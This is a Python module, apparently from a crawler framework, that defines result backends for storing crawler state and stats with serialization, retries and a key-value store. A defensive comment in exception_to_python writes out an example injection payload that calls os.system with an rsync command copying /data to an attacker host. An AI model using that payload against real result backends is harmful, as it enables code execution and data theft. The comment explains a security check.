import sys
import time
import enum
from datetime import timedelta

from kombu.serialization import dumps, loads, prepare_accept_content
from kombu.serialization import registry as serializer_registry
from kombu.utils.encoding import bytes_to_str, ensure_bytes
from kombu.utils.url import maybe_sanitize_url

import tider.exceptions
from tider.exceptions import (
    raise_with_context,
    BackendReadError, BackendStoreError,
    CrawlerRevokedError, SecurityError
)
from tider.utils.time import get_exponential_backoff_interval
from tider.utils.serialization import (
    create_exception_cls, ensure_serializable,
    get_pickleable_exception, get_pickled_exception
)

__all__ = ('backend_serializer_registry', 'BaseBackend', 'KeyValueStoreBackend', 'State')

EXCEPTION_ABLE_CODECS = frozenset({'pickle'})

E_NO_BACKEND = """
No backend is configured.
Please see the documentation for more information.
"""

# None represents the precedence of an unknown state.
# Lower index means higher precedence.
PRECEDENCE = [
    'SUCCESS',
    'FAILURE',
    None,
    'REVOKED',
    'STARTED',
    'PENDING',
]

#: Hash lookup of PRECEDENCE to index
PRECEDENCE_LOOKUP = dict(zip(PRECEDENCE, range(0, len(PRECEDENCE))))
NONE_PRECEDENCE = PRECEDENCE_LOOKUP[None]

# use backend_serializer_registry.register to
# register any custom serialization method.
backend_serializer_registry = serializer_registry


def precedence(state: str) -> int:
    """Get the precedence index for state.

    Lower index means higher precedence.
    """
    try:
        return PRECEDENCE_LOOKUP[state]
    except KeyError:
        return NONE_PRECEDENCE


class State(str, enum.Enum):
    #: Crawler state is unknown (assumed pending since you know the hostname).
    PENDING = 'PENDING'
    #: Crawler was started.
    STARTED = 'STARTED'
    #: Crawler succeeded
    SUCCESS = 'SUCCESS'
    #: Crawler failed
    FAILURE = 'FAILURE'
    #: Crawler was revoked.
    REVOKED = 'REVOKED'
    IGNORED = 'IGNORED'

    def __gt__(self, other: str) -> bool:
        return precedence(self) < precedence(other)

    def __ge__(self, other: str) -> bool:
        return precedence(self) <= precedence(other)

    def __lt__(self, other: str) -> bool:
        return precedence(self) > precedence(other)

    def __le__(self, other: str) -> bool:
        return precedence(self) >= precedence(other)


class Backend:

    EXCEPTION_STATES = frozenset({State.FAILURE, State.REVOKED})
    READY_STATES = frozenset({State.SUCCESS, State.FAILURE, State.REVOKED})

    config_namespace = 'BACKEND'

    #: If true the backend must implement :meth:`get_many`.
    supports_native_join = False

    #: If true the backend must automatically expire results.
    #: The daily backend_cleanup periodic task won't be triggered
    #: in this case.
    supports_autoexpire = False

    #: Set to true if the backend is persistent by default.
    persistent = True

    retry_policy = {
        'max_retries': 20,
        'interval_start': 0,
        'interval_step': 1,
        'interval_max': 1,
    }

    def __init__(self, crawler, serializer=None, accept=None, expires=None, expires_type=None, url=None):
        self.crawler = crawler  # allow_dup
        settings = self.crawler.settings
        self.serializer = serializer or settings.get(f'{self.config_namespace}_SERIALIZER', 'json')
        (self.content_type,
         self.content_encoding,
         self.encoder) = serializer_registry._encoders[self.serializer]
        self.expires = self.prepare_expires(expires, expires_type)

        # precedence: accept, conf.result_accept_content
        self.accept = settings.get(f"{self.config_namespace}_ACCEPT_CONTENT") if accept is None else accept
        self.accept = prepare_accept_content(self.accept)

        self.always_retry = settings.get(f'{self.config_namespace}_ALWAYS_RETRY', False)
        self.max_sleep_between_retries_ms = settings.get(f'{self.config_namespace}_MAX_SLEEP_BETWEEN_RETRIES_MS', 10000)
        self.base_sleep_between_retries_ms = settings.get(f'{self.config_namespace}_BASE_SLEEP_BETWEEN_RETRIES_MS', 10)
        self.max_retries = settings.get(f'{self.config_namespace}_MAX_RETRIES', float("inf"))
        self.thread_safe = settings.get(f'{self.config_namespace}_THREAD_SAFE', False)

        self.url = url

    def as_uri(self, include_password=False):
        """Return the backend as an URI, sanitizing the password or not."""
        # when using maybe_sanitize_url(), "/" is added
        # we're stripping it for consistency
        if include_password:
            return self.url
        url = maybe_sanitize_url(self.url or '')
        return url[:-1] if url.endswith(':///') else url

    def mark_as_started(self):
        """Mark crawler as started."""
        return self.store_result(self.crawler.stats.get_stats(), State.STARTED)

    def mark_as_done(self, store_result=True, state=State.SUCCESS):
        """Mark crawler as successfully executed."""
        if not store_result:
            return
        self.store_result(self.crawler.stats.get_stats(), state)

    def mark_as_failure(self, exc, traceback=None, store_result=True, state=State.FAILURE):
        """Mark crawler as executed with failure."""
        if not store_result:
            return
        self.store_result(exc, state, traceback=traceback)

    def mark_as_revoked(self, reason='', store_result=True, state=State.REVOKED):
        exc = CrawlerRevokedError(reason)
        if store_result:
            self.store_result(exc, state, traceback=None)

    def prepare_exception(self, exc, serializer=None):
        """Prepare exception for serialization."""
        serializer = self.serializer if serializer is None else serializer
        if serializer in EXCEPTION_ABLE_CODECS:
            return get_pickleable_exception(exc)
        exctype = type(exc)
        return {'exc_type': getattr(exctype, '__qualname__', exctype.__name__),
                'exc_message': ensure_serializable(exc.args, self.encode),
                'exc_module': exctype.__module__}

    def exception_to_python(self, exc):
        """Convert serialized exception to Python exception."""
        if not exc:
            return None
        elif isinstance(exc, BaseException):
            if self.serializer in EXCEPTION_ABLE_CODECS:
                exc = get_pickled_exception(exc)
            return exc
        elif not isinstance(exc, dict):
            try:
                exc = dict(exc)
            except TypeError as e:
                raise TypeError(f"If the stored exception isn't an "
                                f"instance of "
                                f"BaseException, it must be a dictionary.\n"
                                f"Instead got: {exc}") from e

        exc_module = exc.get('exc_module')
        try:
            exc_type = exc['exc_type']
        except KeyError as e:
            raise ValueError("Exception information must include "
                             "the exception type") from e
        if exc_module is None:
            cls = create_exception_cls(exc_type, __name__)
        else:
            try:
                # Load module and find exception class in that
                cls = sys.modules[exc_module]
                # The type can contain qualified name with parent classes
                for name in exc_type.split('.'):
                    cls = getattr(cls, name)
            except (KeyError, AttributeError):
                cls = create_exception_cls(exc_type, tider.exceptions.__name__)
        exc_msg = exc.get('exc_message', '')

        # If the recreated exception type isn't indeed an exception,
        # this is a security issue. Without the condition below, an attacker
        # could exploit a stored command vulnerability to execute arbitrary
        # python code such as:
        # os.system("rsync /data attacker@192.168.56.100:~/data")
        # The attacker sets the task's result to a failure in the result
        # backend with the os as the module, the system function as the
        # exception type and the payload
        # rsync /data attacker@192.168.56.100:~/data
        # as the exception arguments like so:
        # {
        #   "exc_module": "os",
        #   "exc_type": "system",
        #   "exc_message": "rsync /data attacker@192.168.56.100:~/data"
        # }
        if not isinstance(cls, type) or not issubclass(cls, BaseException):
            fake_exc_type = exc_type if exc_module is None else f'{exc_module}.{exc_type}'
            raise SecurityError(f"Expected an exception class, got {fake_exc_type} with payload {exc_msg}")

        # XXX: Without verifying `cls` is actually an exception class,
        #      an attacker could execute arbitrary python code.
        #      cls could be anything, even eval().
        try:
            if isinstance(exc_msg, (tuple, list)):
                exc = cls(*exc_msg)
            else:
                exc = cls(exc_msg)
        except Exception as err:  # noqa
            exc = Exception(f'{cls}({exc_msg})')

        return exc

    def prepare_value(self, result):
        """Prepare value for storage."""
        return result

    def encode(self, data):
        _, _, payload = self._encode(data)
        return payload

    def _encode(self, data):
        return dumps(data, serializer=self.serializer)

    def meta_from_decoded(self, meta):
        if meta['status'] in self.EXCEPTION_STATES:
            meta['result'] = self.exception_to_python(meta['result'])
        return meta

    def decode_result(self, payload):
        return self.meta_from_decoded(self.decode(payload))

    def decode(self, payload):
        if payload is None:
            return payload
        payload = payload or str(payload)
        return loads(payload,
                     content_type=self.content_type,
                     content_encoding=self.content_encoding,
                     accept=self.accept)

    def prepare_expires(self, value, exp_type=None):
        if value is None:
            value = self.crawler.settings.get(f'{self.config_namespace}_EXPIRES', 7 * 86400)
        if isinstance(value, timedelta):
            value = value.total_seconds()
        if value is not None and exp_type:
            return exp_type(value)
        return value

    def prepare_persistent(self, enabled=None):
        if enabled is not None:
            return enabled
        persistent = self.crawler.settings.get(f'{self.config_namespace}_PERSISTENT')
        return self.persistent if persistent is None else persistent

    def encode_result(self, result, state):
        if state in self.EXCEPTION_STATES and isinstance(result, Exception):
            return self.prepare_exception(result)
        return self.prepare_value(result)

    def _gen_crawler_meta(self, result, state, traceback, format_date=True):
        if state in self.READY_STATES:
            date_done = self.crawler.app.now()
            if format_date:
                date_done = date_done.isoformat()
        else:
            date_done = None
        meta = {
            'schema': self.crawler.schema,
            'spidername': self.crawler.spidername,
            'pid': self.crawler.pid,
            'server': self.crawler.svr,
            'group': self.crawler.group,
            'status': state,
            'stats': result,
            'failures': {},
            'errors': {},
            'traceback': traceback,
            'date_done': date_done,
        }
        return meta

    def _sleep(self, amount):
        time.sleep(amount)

    def store_result(self, result, state, traceback=None, **kwargs):
        """Update crawler state and stats.

        if always_retry_backend_operation is activated, in the event of a recoverable exception,
        then retry operation with an exponential backoff until a limit has been reached.
        """
        result = self.encode_result(result, state)  # stats, errors, failures.
        retries = 0
        while True:
            try:
                return self._store_result(result, state, traceback, **kwargs)
            except Exception as exc:
                if self.always_retry and self.exception_safe_to_retry(exc):
                    if retries < self.max_retries:
                        retries += 1

                        # get_exponential_backoff_interval computes integers
                        # and time.sleep accept floats for sub second sleep
                        sleep_amount = get_exponential_backoff_interval(
                            self.base_sleep_between_retries_ms, retries,
                            self.max_sleep_between_retries_ms, True) / 1000
                        self._sleep(sleep_amount)
                    else:
                        raise_with_context(
                            BackendStoreError("Failed to store result on the backend"),
                        )
                else:
                    raise

    def forget(self, group=False):
        if not group:
            self._forget()
        else:
            self._delete_group()

    def _forget(self):
        raise NotImplementedError('backend does not implement forget.')

    def get_state(self):
        """Get the state of a task."""
        return self.get_meta()['status']

    def get_traceback(self):
        """Get the traceback for a failed task."""
        return self.get_meta().get('traceback')

    def get_stats(self):
        """Get the stats of a crawler."""
        return self.get_meta().get('stats')

    def get_errors(self):
        """Get the errors of a crawler."""
        return self.get_meta().get('errors')

    def get_failures(self):
        """Get the failures of a crawler."""
        return self.get_meta().get('failures')

    def exception_safe_to_retry(self, exc):
        """Check if an exception is safe to retry.

        Backends have to overload this method with correct predicates dealing with their exceptions.

        By default, no exception is safe to retry, it's up to backend implementation
        to define which exceptions are safe.
        """
        return False

    def get_meta(self, group=False):
        """Get crawler meta from backend.

        if always_retry_backend_operation is activated, in the event of a recoverable exception,
        then retry operation with an exponential backoff until a limit has been reached.
        """
        retries = 0
        while True:
            try:
                if group:
                    return self._get_group_meta()
                return self._get_crawler_meta()
            except Exception as exc:
                if self.always_retry and self.exception_safe_to_retry(exc):
                    if retries < self.max_retries:
                        retries += 1

                        # get_exponential_backoff_interval computes integers
                        # and time.sleep accept floats for sub second sleep
                        sleep_amount = get_exponential_backoff_interval(
                            self.base_sleep_between_retries_ms, retries,
                            self.max_sleep_between_retries_ms, True) / 1000
                        self._sleep(sleep_amount)
                    else:
                        raise_with_context(
                            BackendReadError("Failed to get meta"),
                        )
                else:
                    raise

    def cleanup(self):
        """Backend cleanup."""

    def close(self):
        """Release backend resources."""


class BaseBackend(Backend):
    """Base stats backend."""


class KeyValueStoreBackend(Backend):
    key_t = ensure_bytes
    crawler_keyprefix = 'tider-crawler-meta-'

    def __init__(self, *args, **kwargs):
        if hasattr(self.key_t, '__func__'):  # pragma: no cover
            self.key_t = self.key_t.__func__  # remove binding
        super().__init__(*args, **kwargs)
        self._resolve_keyprefix()

    def _resolve_keyprefix(self):
        """
        This method prepends the global keyprefix to the existing keyprefixes.

        This method checks if a global keyprefix is configured in `result_backend_transport_options` using the
        `global_keyprefix` key. If so, then it is prepended to the task, group and chord key prefixes.
        """
        global_keyprefix = self.crawler.settings.get(f'{self.config_namespace}_TRANSPORT_OPTIONS', {}).get("global_keyprefix", None)
        if global_keyprefix:
            if global_keyprefix[-1] not in ':_-.':
                global_keyprefix += '_'
            self.crawler_keyprefix = f"{global_keyprefix}{self.crawler_keyprefix}"
        self.crawler_keyprefix = self.key_t(self.crawler_keyprefix)

    def get(self, key):
        raise NotImplementedError('Must implement the get method.')

    def mget(self, keys):
        raise NotImplementedError('Does not support get_many')

    def set(self, key, value):
        raise NotImplementedError('Must implement the set method.')

    def delete(self, key):
        raise NotImplementedError('Must implement the delete method')

    def scan(self, pattern):
        raise NotImplementedError('Does not support get_many')

    def incr(self, key):
        raise NotImplementedError('Does not implement incr')

    def expire(self, key, value):
        pass

    def _get_crawler_meta(self):
        """Get crawler meta-data."""
        meta = self.get(self.get_crawler_key())
        if not meta:
            return {'status': State.PENDING, 'stats': None}
        return self.decode_result(meta)

    def get_crawler_key(self):
        """Get the cache key for crawler."""
        key_t = self.key_t
        return key_t('').join([
            self.crawler_keyprefix, key_t(self.crawler.hostname)
        ])

    def _strip_prefix(self, key):
        """Take bytes: emit string."""
        key = self.key_t(key)
        prefix = self.crawler_keyprefix
        if key.startswith(prefix):
            return bytes_to_str(key[len(prefix):])
        return bytes_to_str(key)

    def _filter_ready(self, values):
        for k, value in values:
            if value is not None:
                value = self.decode_result(value)
                if value['status'] in self.READY_STATES:
                    yield k, value

    def _mget_to_results(self, values, keys):
        if hasattr(values, 'items'):
            # client returns dict so mapping preserved.
            return {
                self._strip_prefix(k): v
                for k, v in self._filter_ready(values.items())
            }
        else:
            # client returns list so need to recreate mapping.
            return {
                bytes_to_str(self._strip_prefix(keys[i])): v
                for i, v in self._filter_ready(enumerate(values))
            }

    def _get_many(self, timeout=None, interval=0.5,
                  on_message=None, on_interval=None, max_iterations=None):
        interval = 0.5 if interval is None else interval
        iterations = 0
        ids = set([each for each in self.scan(pattern=f'{self.crawler.group}*')])
        while ids:
            keys = list(ids)
            r = self._mget_to_results(self.mget(keys), keys)
            ids.difference_update({bytes_to_str(v) for v in r})
            for key, value in r.items():
                if on_message is not None:
                    on_message(value)
                yield bytes_to_str(key), value
            if timeout and iterations * interval >= timeout:
                raise TimeoutError(f'Operation timed out ({timeout})')
            if on_interval:
                on_interval()
            time.sleep(interval)  # don't busy loop.
            iterations += 1
            if max_iterations and iterations >= max_iterations:
                break

    def _get_group_meta(self):
        result = {k: v for k, v in self._get_many()}
        return result

    def _forget(self):
        self.delete(self.get_crawler_key())

    def _delete_group(self):
        for key in self.scan(pattern=f'{self.crawler.group}*'):
            self.delete(key)

    def _store_result(self, result, state, traceback=None, **kwargs):
        meta = self._gen_crawler_meta(result=result, state=state, traceback=traceback)
        meta['hostname'] = self.crawler.hostname
        self.set(self.get_crawler_key(), self.encode(meta))
        return result
